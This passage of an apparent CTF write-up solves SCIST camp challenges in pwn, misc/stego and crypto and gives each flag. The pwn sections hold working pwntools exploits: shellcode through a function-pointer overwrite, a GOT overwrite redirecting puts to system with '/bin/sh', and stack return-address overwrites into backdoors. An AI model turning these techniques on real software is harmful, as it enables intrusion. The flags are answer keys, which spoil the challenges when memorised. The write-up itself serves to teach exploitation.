    scanf("%s", buf);

    int *test_num = (int *)(compare_buf + 12);
    if (*(test_num) > 1633771873){
        puts("Here's your flag : SCIST{test}");
    }

    puts("Bye~");

    return 0;
}
```

Key part:

```c
char buf[0x10] = {};
char compare_buf[0x10] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 'a', 'a', 'a', 'a'};

scanf("%s", buf);

int *test_num = (int *)(compare_buf + 12);
if (*(test_num) > 1633771873){
    puts("Here's your flag : SCIST{test}");
}
```

I think I don't need any explanation. Just notice that the ASCII value of `a` is `0x61` so we use `b`. And

```python
>>> print(hex(1633771873))
0x61616161
```

```bash
$ nc lab.scist.org 13373
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
Here's your flag : SCIST{This_ch4l1eng3_I5_t0o_EaSY,_I_w4n7_1t_h@rd3r!}
Bye~
```

`SCIST{This_ch4l1eng3_I5_t0o_EaSY,_I_w4n7_1t_h@rd3r!}`

### Catshop

Full code:

```c
// gcc -fno-stack-protector chal.c -o chal
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <time.h>
#include <sys/mman.h>

char new_name_buff[0x30];
char *cat_list[] = {
    "kiki",
    "lucky",
    "cola",
    "dio",
};
void (*meow)();

void meow1()
{
    puts("MEOW!!");
}

void meow2()
{
    puts("m~e~o~w~");
}

void meow3()
{
    puts("m...eo...w");
}

void init_proc()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    
    unsigned long data_addr = (unsigned long)&new_name_buff & ~0xfff;
    mprotect((void *)data_addr, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE);
}

int main()
{
    init_proc();

    int idx;

    srand(time(NULL));
    switch (rand() % 3) {
    case 0: meow = meow1; break;
    case 1: meow = meow2; break;
    case 2: meow = meow3; break;
    }

    printf("Welcome to catshop, which one do you want to buy?\n");
    for (int i = 0; i < sizeof(cat_list) / sizeof(cat_list[0]); i++)
        printf("%d. %s\n", i + 1, cat_list[i]);
    printf("> ");

    scanf("%d", &idx);

    printf("New name\n> ");
    read(0, new_name_buff, 0x30);
    cat_list[idx] = &new_name_buff;

    printf("%s: ", cat_list[idx]);
    meow();
    printf("\n");

    return 0;
}
```

Key part of program, some are redacted.

```c
char new_name_buff[0x30];
...
void (*meow)();
...
void init_proc()
{
...
    unsigned long data_addr = (unsigned long)&new_name_buff & ~0xfff;
    mprotect((void *)data_addr, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE);
}
...
int main()
{
...
    scanf("%d", &idx);
...
    read(0, new_name_buff, 0x30);
    cat_list[idx] = &new_name_buff;
...
    meow();
}
```

Trivial aaw, although NX is enabled but it still gave us some space with `rwx`. Be careful calculating the offset. Just overwrite meow pointer with address of shellcode. (Notice that the size of char pointer is 8 bytes here.)

```python
from pwn import *
import sys

# context.log_level = "debug"
cat_list = 0x0000000000004020
meow = 0x0000000000004060
new_name_buff = 0x0000000000004080
sizeof_long_long = 0x8
sc = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

if len(sys.argv) == 1:
    r = process("./chal")
    # gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
r.sendlineafter(b"> ", str((meow - cat_list) // sizeof_long_long))
r.sendlineafter(b"> ", sc)
r.recvuntil(b": ")
r.sendline(b"cat /home/`whoami`/flag")
r.interactive()
```

### email

Full code:

```c
// gcc -z lazy -no-pie chal.c -o chal 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char title[0x10];

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    if ((unsigned long)main == 0x8787)
        system("echo owo");

    unsigned long from, to;

    printf("Title\n> ");
    read(0, title, 0x10);

    printf("Sender\n> ");
    scanf("%lu", &from);
    
    printf("Receiver\n> ");
    scanf("%lu", &to);

    memcpy((void *)to, (void *)from, 0x8);

    puts(title);
    puts("Done !");

    exit(0);
}
```

Key part: It copies 16 bytes from anywhere to anywhere.

```c
if ((unsigned long)main == 0x8787) system("echo owo");
unsigned long from, to;
printf("Title\n> ");
read(0, title, 0x10);
printf("Sender\n> ");
scanf("%lu", &from);
printf("Receiver\n> ");
scanf("%lu", &to);
memcpy((void *)to, (void *)from, 0x8);
puts(title);
puts("Done !");
exit(0);
```

We want to hijack control flow, we don't have libc address so we cannot overwrite the exit hook with one gadget. (That's my first thought, really poisonous(?)). This problem is simply solved by overwriting the got entry. Of course our victim is `puts` since we have `puts(something we can control)`. We can overwrite the got entry of `puts` with `system` got entry and then call `puts` with `/bin/sh` as argument. But why? (Just for thinking: why not overwrite `puts@got` with `system@plt`? Trace with gdb and you will know why.)

Most writeup didn't explain why we change `puts@got` to `system@got` works? Like [this writeup](https://hackmd.io/@akvo-fajro/scist_final_exam_write_up#email) says "from `system_got` get address of `system_plt` (because system is not called)", really?

Actions speak louder than words. I traced the lazy binding procedure with gdb.

If the function has been called then got is it's real address in libc.

For those who haven't been called, got has the address to the gadget 1.

However in older version of gcc's code, the got is the address to plt + 6. Not sure it's because the version of gcc or the version of libc or some other reason. But this information is from a pwn material of 2019 by `yuawn`, and the correct version is found from 2021's material by `u1f383`.

Below is the end of the exploit of this challenge: calling puts -> `system@got` (address to gadget 1)

Gadget 1 looks like:

```text
0x401040:	endbr64 
0x401044:	push   0x1 <this is some offset>
0x401049:	bnd jmp 0x401020 <this is gadget 2>
0x40104f:	nop
```

Then the gadget 2:

```text
0x401020:	push   QWORD PTR [rip+0x2fe2]        # 0x404008
0x401026:	bnd jmp QWORD PTR [rip+0x2fe3]        # 0x404010
0x40102d:	nop    DWORD PTR [rax]
```

Then after some `si` we found that it calls `_dl_runtime_resolve_xsavec`

So actually these gadgets are just calling `_dl_runtime_resolve(link_map, offset)`, this function gave us real address to libc function and put it back to got. You can find more details online.

POC:

```text
gdb-peda$ got

/chal:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000403ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
0000000000403ff8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000404060 R_X86_64_COPY     stdout@GLIBC_2.2.5
0000000000404070 R_X86_64_COPY     stdin@GLIBC_2.2.5
0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000404020 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5
0000000000404028 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000404030 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0000000000404038 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5
0000000000404040 R_X86_64_JUMP_SLOT  __isoc99_scanf@GLIBC_2.7
0000000000404048 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5

gdb-peda$ x/wx 0x0000000000404020
0x404020 <system@got[plt]>:	0x4375dd60
gdb-peda$ x/gx 0x0000000000404020
0x404020 <system@got[plt]>:	0x00007f294375dd60
gdb-peda$ x/gx 0x0000000000404018
0x404018 <puts@got[plt]>:	0x0000000000401040
gdb-peda$ xinfo 0x00007f294375dd60
0x7f294375dd60 (<__libc_system>:	endbr64)
Virtual memory mapping:
Start : 0x00007f2943735000
End   : 0x00007f29438ca000
Offset: 0x28d60
Perm  : r-xp
Name  : /usr/lib/x86_64-linux-gnu/libc.so.6
```

The GOT entry of system function is filled with the real address of system function in libc. But puts doesn't.

Actually if you disassemble main function, you'll find out this program calls puts at the very end...

Exploit:

```python
from pwn import *
import sys

from_address = 0x404020  # system@got
to_address = 0x404018  # puts@got

if len(sys.argv) == 1:
    r = process("./chal")
    gdb.attach(r, "b *0x00000000004012f5\nb _dl_runtime_resolve_xsavec")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)

r.sendlineafter(b"> ", b"/bin/sh\x00")
r.sendlineafter(b"> ", str(from_address).encode())
r.sendlineafter(b"> ", str(to_address).encode())
r.interactive()
```

`SCIST{u_4R3_4_G00D_p057m4N}`

### file-manager

Full code:

```c
// gcc -z now -fno-stack-protector -no-pie chal.c -o chal
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define FILE_LEN 4

struct File {
    char content[0x20];
};

struct File *curr;
char name_buf[0x40];

int main()
{
    if ((unsigned long)main == 0x8787)
        execve("/bin/sh", NULL, NULL);

    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    struct File files[FILE_LEN];
    char opt[2];
    int copy_file_idx;
    int file_idx = 0;

    printf("What's your name?\n> ");
    read(0, name_buf, 0x40);
    printf("Hello, %s !\n", name_buf);

    while (1)
    {
        printf(
            "1. new file\n"
            "2. edit file\n"
            "3. copy file\n"
            "4. exit\n"
            "> ");
        read(0, opt, 2);

        switch (opt[0]) {
        case '1':
            if (file_idx < 0 || file_idx++ >= FILE_LEN)
                break;
            
            curr = &files[file_idx];
            printf("Current file %d\n", file_idx);
            break;

        case '2':
            printf("New content\n> ");
            read(0, curr->content, 0x20);
            break;

        case '3':
            printf("Copy from\n> ");
            scanf("%d", &copy_file_idx);
            memcpy(&curr->content, files[copy_file_idx].content, 0x20);
            break;
        
        case '4':
            goto bye;
        }
    }

bye:
    __asm__("xor %rdx, %rdx");
    return 0;
}
```

The vulnerability is obvious. `file_idx++ >= FILE_LEN` actually means `file_idx >= FILE_LEN` and `file_idx++`. So `file_idx` max is 4, which is out of bound of `struct File files[FILE_LEN]`. Notice that `files` array is on the stack, so we may overwrite the return address of `main` function by writing to index 4 that does not exist.

After some testing, we see that the offset is 24, so just jump to backdoor function, shell out.

```python
from pwn import *
import sys

# context.log_level = "debug"


if len(sys.argv) == 1:
    r = process("./chal")
    # gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)

padding = b"A" * 24

bd = 0x00000000004011F4
r.sendlineafter(b"> ", b"I am a dog")
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"> ", padding + p64(bd))
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"3")
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"4")
r.recvuntil(b"> ")

r.interactive()
```

Btw, I think `__asm__("xor %rdx, %rdx");` is interesting here. Here it wants to make the third argument of `execve` (which is `const char *const envp[]`) 0, but I think jumping to `0x00000000004011f4` is OK and `edx` is set to 0 here (lower part of `rdx`). Maybe the author found out that the upper part of `rdx` is not 0, so he added this line to make sure that `rdx` is 0.(?)

```text
0x00000000004011f4 <+30>:    mov    edx,0x0
0x00000000004011f9 <+35>:    mov    esi,0x0
0x00000000004011fe <+40>:    lea    rdi,[rip+0xe03]        # 0x402008
0x0000000000401205 <+47>:    call   0x4010b0 <execve@plt>
```

**UPD**: No! I use gdb and set breakpoint before xor rdx rdx, and I found that rdx is 0x2 then. So I think it's not necessary to add this line.

`SCIST{pl4Y_W17h_F1le}`

### Warmup

Full code:

```c
// gcc -fno-stack-protector -no-pie chal.c -o chal
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void backdoor()
{
    system("/bin/sh");
    exit(0);
}

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char buf[0x20];

    printf("What's your name?\n> ");
    read(0, buf, 0x100);

    printf("Hello, %s !\n", buf);

    return 0;
}
```

Just return to backdoor, be aware of MOVAPS issue.

```python
from pwn import *
import sys

"""
00000000004011b6 <backdoor>:
  4011b6:       f3 0f 1e fa             endbr64
  4011ba:       55                      push   rbp
  4011bb:       48 89 e5                mov    rbp,rsp
  4011be:       48 8d 3d 3f 0e 00 00    lea    rdi,[rip+0xe3f]        # 402004 <_IO_stdin_used+0x4>
"""
bd = 0x00000000004011BB
padding = b"A" * 0x28

if len(sys.argv) == 1:
    r = process("./chal")
    # gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)

r.sendlineafter(b"> ", padding + p64(bd))
r.recvuntil(b"!")
r.interactive()
```

`SCIST{Ju5T_WaRmUp}`

## Misc

### Counting

Submit the most occurrences strings as flag

Just simple bash scripting. Learned this bash sorting and ranking chain from inndy.

```bash
$ cat output | sort | uniq -c | sort -nr | head -n 1 | grep -oE "SCIST{.*}" --color=never
SCIST{https://www.youtube.com/watch?v=ub82Xb1C8os}
```

### Points Plot

Given a coordinate file, plot it and find the flag.

My freaking slow solution, it took me 12 minutes to finish the plotting:

```python
import turtle

coor_list = open('coordinates.txt', 'r').read().splitlines()
turtle.screensize(canvwidth=1024, canvheight=1024)
turtle.speed(0)
tt = turtle.Turtle(visible=False)
tt.penup()
for coor in coor_list:
	x,y = coor.split(" ")
	tt.goto(int(x), int(y))
	tt.dot(1)
turtle.done()
```

After some researching we have a much, much faster solution:

```python
import numpy
import matplotlib.pyplot as plt
x = []
y = []
coor_list = open('coordinates.txt', 'r').read().splitlines()
for coor in coor_list:
	x.append(int(coor.split(" ")[0]))
	y.append(int(coor.split(" ")[1]))
xs = numpy.array(x)
ys = numpy.array(y)
plt.scatter(xs, ys,s=5)
# plt.gca().invert_xaxis()
plt.gca().invert_yaxis()
plt.savefig('plot.png')
```

Although this only took a few seconds to render image, I think the image quality is worse than the turtle one.

**UPD**: I found the best solution of coordinate to image [here](https://blog.terrynini.tw/tw/2019-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/#solve-4).

```python
#!/usr/bin/env python3
import numpy as np
from PIL import Image
import string
h, w = 100, 600
arr = np.zeros([h,w])
for i in range(h):
    for j in range(w):
        arr[i][j] = 0
coor_list = open('coordinates.txt', 'r').read().splitlines()
for coor in coor_list:
	arr[int(coor.split(" ")[1])][int(coor.split(" ")[0])] = 255
img = Image.fromarray(np.uint8(arr),"L")
img.save("flag.png")
```

Moreover, I've tried OCR(Pytesseract) to get the flag automatically, but it failed with result `SClSTicoding_is_hard}` since tesseract can't recognize the punctuations correctly. Maybe more training data is needed.

```python
#!/usr/bin/env python3
import numpy as np
from PIL import Image
import pytesseract
import string
h, w = 100, 600
arr = np.zeros([h,w])
for i in range(h):
    for j in range(w):
        arr[i][j] = 0
coor_list = open('coordinates.txt', 'r').read().splitlines()
for coor in coor_list:
	arr[int(coor.split(" ")[1])][int(coor.split(" ")[0])] = 255
img = Image.fromarray(np.uint8(arr),"L")
text = pytesseract.image_to_string(img, lang='eng',config='--psm 6')
print(text)
```

`SCIST{coding_is_hard:(}`

### 1460 Data System

Crack sha256 hash `cc3ecde41ff425296f9ea008b8a8ba3a2282fc042672f77ab2681426ea9dbabc` with given wordlist.

```python
import hashlib

wordlist = open('password_list', 'r').read().splitlines()

target = "cc3ecde41ff425296f9ea008b8a8ba3a2282fc042672f77ab2681426ea9dbabc"

for word in wordlist:
    if hashlib.sha256(word.encode()).hexdigest() == target:
        print("SCIST{" + word + "}")
        break
```

`SCIST{ak7Q0kYhrTYd5ILQ2gm}`

### BBBGGGMMM

Description:

```text
答案就在歌名的第一個字
The answer lies in the first letter of the song title.
```

`binwalk`, `stegsolve`, `pngcheck` nothing special.

`zsteg` found something interesting in `b1,bgr,lsb,xy`.

Extract out the data:

```bash
$ zsteg -E b1,bgr,lsb,xy BBBGGGMMM.png | less
S
C
I
S
T
{
https://www.youtube.com/watch?v=RnBT9uUYb1w
space
https://www.youtube.com/watch?v=AJtDXIazrMo
https://www.youtube.com/watch?v=PaKr9gWqwl4
https://www.youtube.com/watch?v=X5y9Q5CmWYg
https://www.youtube.com/watch?v=5BcDdY8x3qY
space
https://www.youtube.com/watch?v=_SmYDJpp_3Y
https://www.youtube.com/watch?v=JflOKxCx97o
https://www.youtube.com/watch?v=5BcDdY8x3qY
space
https://www.youtube.com/watch?v=mfJhMfOPWdE
https://www.youtube.com/watch?v=stGUpMav1sc
https://www.youtube.com/watch?v=bqLRqzfD3iY
}

(word inside is all lowercase and has meaning)
```

`SCIST{i love the bgm}`

### Blank

Use any tool you like to find the png in png. (`binwalk`, `zsteg`...)

Then it's another png file with a blank image. Guess it's stego again.

StegSolve and set red plane 0, we can see the flag.

`SCIST{You_can_see_me_John_Cena}`

### Forced Propaganda

SCIST 3rd WinterCamp
這一題的資料都只有在 RGB 的最後一個 bit
The data for this question is only in the last bit of RGB

Author : Curious

No image in image, no stego, no nothing.

Try to extract last bit of RGB, found crap.

According to a hint from Curious, maybe we can try to change order when extracting and look at the beginning of the data.

After I tried to extract the last bit with BGR and by row, I found the first three bits is `45 4c 46` ("ELF"), got it. I use Data Extract in stegsolve here.

We still need to fix the binary, which is easy.

```python
with open("damaged_ELF", "rb") as input_file:
    bytes_data = input_file.read()
patched_bytes = b"\x7f" + bytes_data  # Magic number

with open("fixed_ELF", "wb") as output_file:
    output_file.write(patched_bytes)
```

Execute the binary, we got the flag.

`SCIST{Magic!_M4g1c!_M@Gi(!__Magic_Number!!!}`

### Dubbit

SCIST 3rd Midterm
我把 f14g 藏在 instagram 粉專裡面，去找吧！

如果找不到的話，至少還可以追蹤可愛的兔兔～

或許用得到的東西：

Leet
pillow
Euclidean distance
p.s. 此題 flag 格式為 flag{xxxxxx}


Author : killua4564

https://www.instagram.com/dubbit0923/

I didn't solve this challenge... I read author's WP [here](https://hackmd.io/@killua4564/S1QX1qFYj#Dubbit)

There's an interesting instagram post with strange keyword `5<157`, that's `leet` for `SCIST`.

Now we need a little guessing: `找一找我哪裡不一樣呢？` means find the difference, how can I show the different pixels?

Actually we can use the following command to find the difference between two images.

```bash
compare 322345373_694077352206528_1743678478890944810_n.jpg 322517147_216740087461768_2497761654631074599_n.jpg -compose src diff.jpg
```

For this problem it's enough for us to recognize the flag (the most "damaged" part is the first word `flag`, but we already knew the flag format). However in some extreme problems, we need to calculate the Euclidean distance between each pixel of two images. Once above the threshold, we can say the pixel is "different".

Or you can use Image Combiner in Stegsolve. (I use this.)

FYI, author's solving script:

```python
from PIL import Image

distance = lambda x, y: sum((i - j) ** 2 for i, j in zip(x, y))

image1 = Image.open("image1.jpg")
image2 = Image.open("image2.jpg")

pixel1 = image1.load()
pixel2 = image2.load()

for w in range(image1.width):
    for h in range(image1.height):
        if distance(pixel1[w, h], pixel2[w, h]) > 64:
            pixel1[w, h] = (0, 0, 0)
        else:
            pixel1[w, h] = (255, 255, 255)

image1.save("diff.jpg", quality=100)
```

`flag{dubbit_15_cute}`

### Stone Mask

The program counts down from 10 seconds, and then it will print out the flag. However, it'll immediately clear the terminal screen so we can't see the flag.

There are many ways to solve this problem, but I think the easiest way is to patch the binary.

Since in the end of `zawarudo` (print flag) function, it calls `sleep(0)`. We can just let it sleep longer.

You can try to patch all the useless sleep at the begging of the program or just patch the clear terminal character to something else.

`SCIST{KO NO DIO DAAAAAAAAAAAA}`

### OAO

Actually I didn't solve this challenge, since I dunno telepathy (Just kidding...). Here's author's [writeup](https://hackmd.io/@killua4564/S1QX1qFYj#OAO).

Solving script from author:

```python
import itertools

import png  # pip install pypng

with open("OAO.png", "rb") as file:
    png_data = png.Reader(file).read()
    pixel_data = list(png_data[2])  # get pixel from png generator
    print(f"height={len(pixel_data[0])} width={len(pixel_data)}")
    
    data = list(itertools.chain.from_iterable(pixel_data))
    print(f"pixel set={set(data)}")
          
    print(f"count={data.count(0xCC)}, index={data.index(0xCC)}")
    print(f"count={data.count(0xEE)}, index={data.index(0xEE)}")
```

We need to find out that the height and width is prime, and analyse the pixel data to find out there's a different bit. And then we can guess it's all about RSA...

I still learned some usage of pypng. I think it's a useful tool for CTF png.

Script kiddie!

```bash
$ ~/RsaCtfTool/RsaCtfTool.py -p 15773 -q 14669 -e 0x10001 --uncipher 0x95c976b
private argument is not set, the private key will not be displayed, even if recovered.

Results for /tmp/tmpdr35guk3:

Unciphered data :
HEX : 0x00307730
INT (big endian) : 3176240
INT (little endian) : 813117440
utf-8 : 0w0
utf-16 : 　ぷ
STR : b'\x000w0'
```

`flag{0w0}`

### Witchcraft

Yet another special alphabet problem. Actually I searched those alphabets with google image and found Runes. We can also check if first four characters is `flag` or not. The rest is easy.

`flag{runic alphabets dagaz owo}`

### FruteForce?

Solve

$3^x=y^3-z$
$x^2+y^2=256325$
$x \times z=y \times 13910+441$

Flag is `SCIST{`$y ^ x \pmod z $`}`

Bruteforcing! ($x, y, z$ should be integers, otherwise the modulo will be meaningless)

```python
candidates = []
for i in range(-507, 508):
    for j in range(-507, 508):
        if i * i + j * j == 256325:
            candidates.append([i, j])
for candidate in candidates:
    x, y = candidate[0], candidate[1]
    z = y**3 - 3**x
    if x * z == y * 13910 + 441:
        print(x, y, z)
        print(y**x % z)
```

`SCIST{188282}`

## Crypto

### Caesar

Rotate it until it fits `SCIST`.

`EOUEF{Awqkk_PqxuouAge_Emxmp}` -> `SCIST{Okeyy_DeliciOus_Salad}`

### ENTRY NUMBER SEVENTEEN

According to some google image research, that's Wingdings font (W.D.Gaster) by anineko on DeviantArt.

`SCIST{W.D.Gaster}`.

### RSA Basic

```python
from Crypto.Util.number import *

flag = '?????'

p = getPrime(1000)
q = getPrime(1000)
n = p*q

e = 65537
m = bytes_to_long(flag)
c = pow(m, e, n)

print("n:", n)
print("e:", e)
print("c:", c)
```

Now it's script kiddie time!

```bash
$ ~/RsaCtfTool/RsaCtfTool.py -n 52884069737627075473432634386432755562233961633209538223480485430471224430927910972307943409523693331993441729302448948027542977984581942917444035583083199016155081907469648103750078394911559107362375536426837434684301679477477392685720698212157673546801884449700052598839644577295047235350396690056535497905478588461599297005786605389769274454472290690563516153485518821915692147421613647724513570342688878550342269011754734737647859829109673929428375798206164803488497804683667985821905431084012700134041129480331103033833764205039331494756959292824204912834053769449255762088851618325846445625392573 -e 65537 --uncipher 48088372422736717697508287108909763463054762774836103910351719786096595364349350753957748762408838262643709897264623055390779057773186429845010455125185612249349935399210277936640988769997890078168628509854798814585530522174261603552800878527314272810146270624699236039373526968195222162929317057492096320658966802735143551969871907445151937495979456726490354595531719060615393683161303809386785381684221901582015020089092882952070616254249244711371762913265102240498151975917789588265670262807688697243154523448223828886773324761834595011244448714212725952721560582951510900826636757907855574986078127
private argument is not set, the private key will not be displayed, even if recovered.

[*] Testing key /tmp/tmpeqh96ft2.
attack initialized...
attack initialized...
[*] Performing factordb attack on /tmp/tmpeqh96ft2.
[*] Attack success with factordb method !

Results for /tmp/tmpeqh96ft2:

Unciphered data :
HEX : 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000053434953547b5253415f69735f7265616c6c795f657a5f666f725f55217d
INT (big endian) : 574658985287584154152618560396575999337631063073735776900649037203841405
INT (little endian) : 56119466322531655993364908194874636006398181064855818316676007146039510249912087118429281855821282211830279330479177795341981557974755928437605719331769106796603984608099791732840006457285820005042240758947568222481739092264919972956434304995151456815111823542634363104945180523844309963555166620771700180002444345365569992355828400746447470764844523312992991052749632748227455944884546129799938111130268727231817588713972383538655485929174935894301912208299750961945617518656047348463188607111451228953400075607427589584680192479313539618829463026535714841935314415947372557346293459565971856718561280
utf-8 : SCIST{RSA_is_really_ez_for_U!}
utf-16 : 䍓卉答卒彁獩牟慥汬役穥晟牯啟紡
STR : b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00SCIST{RSA_is_really_ez_for_U!}'
```

`SCIST{RSA_is_really_ez_for_U!}`

### Baby RSA

```python
import gmpy2,random

FLAG = open('./flag', 'rb').read()
FLAG = int.from_bytes(FLAG, byteorder='big')
p = random.randint(0, 2 ** 1024)
q = random.randint(0, 2 ** 512)

p = gmpy2.next_prime(p)
q = gmpy2.next_prime(p * 31)

e = 65537
d = pow(e, -1, (p - 1) * (q - 1))
N = p * q

print("N:", N)
print("e: 65537")
print("c:", pow(FLAG, e, N))
```

Make script kiddie great again!

```bash
$ ~/RsaCtfTool/RsaCtfTool.py -n 23011183666490618607681464725523758109239020185090401279675798075376628580571829357653414696153411200779073261778574051086208296713001706769282765367974444851768472000686880802434239185461581395120763142316234322376959373898117948774457149863204651018688278917029304888530157473730994603306830735982257794960431849029455028246657610999277012027945943713927438541415405078633416356851157337310687289818654375129475675278945734580815354341458185572300633228085352596908472151978131895689784501160766374905628342747186937957333849656402715748634105362030426311407290630302896978196883118860655723158140860186009200636249 -e 65537 --uncipher 8779237347677810253801158597104914851981431195113616834300020068010824406912812513809117864168640395095638869008952672967438262910822556424188510123872316740683864486933458007777912741144807603614541427145960836357774167138986695970825583672390875273824057339142146116033712986030537390973444795231351681309916537013640949182119733495522998685427873574959241532791681855044909493477963603726132403753174006339473383484270877896069168044633740066069102864633453009538088448603628328321029566349691741687072009875822562380919563383374801311753708029070519201055907815950093577301560278454820239010724613500405647980926
private argument is not set, the private key will not be displayed, even if recovered.

[*] Testing key /tmp/tmpgpt20iai.
attack initialized...
attack initialized...
[*] Performing factordb attack on /tmp/tmpgpt20iai.
[*] Attack success with factordb method !

Results for /tmp/tmpgpt20iai:

Unciphered data :
HEX : 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000053434953547b3537346e64316e365f683372332c315f7233346c317a335f7930755f773372335f6a7535375f6c316b335f6d335f377279316e365f37305f6d346b335f683135373072792e7d
INT (big endian) : 345500440965501809446402597762340128182108126330022986020806159426396437854524475387390432897118060809768993941937401383296215409001469208419012497203620742624149543123263929076756093
INT (little endian) : 15802705500862178255298975759701942532645581768578023095139211117094410089721847756016220731514544272964467419944784097819682832091052349342977822046903460395433669587736312814016238296317308549439188784407205760823356441307278838402939100629236288239498785906955259844007295967909653059756173301372682628823982493371927728712170819853962360535638594617423666910468958484803541609015369839228158612364113005494880356392393877373075435216062018735482045310083239169449291715384614492967973216375791236752143445708625806547407723501864755028051024847951892595085741188892270772868657843118373421565706670048264604090368
utf-8 : SCIST{574nd1n6_h3r3,1_r34l1z3_y0u_w3r3_ju57_l1k3_m3_7ry1n6_70_m4k3_h1570ry.}
utf-16 : 䍓卉答㜵渴ㅤ㙮桟爳ⰳ弱㍲水稱弳べ彵㍷㍲機㕵強ㅬ㍫浟弳爷ㅹ㙮㝟弰㑭㍫桟㔱〷祲紮
STR : b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00SCIST{574nd1n6_h3r3,1_r34l1z3_y0u_w3r3_ju57_l1k3_m3_7ry1n6_70_m4k3_h1570ry.}'
```

`SCIST{574nd1n6_h3r3,1_r34l1z3_y0u_w3r3_ju57_l1k3_m3_7ry1n6_70_m4k3_h1570ry.}`

### Straddle Checkerboard

Thanks Discord: `Curious#9282` for helping me out.

Prerequisite: [https://en.wikipedia.org/wiki/Straddling_checkerboard](https://en.wikipedia.org/wiki/Straddling_checkerboard)

It's ok if you just know the concept.

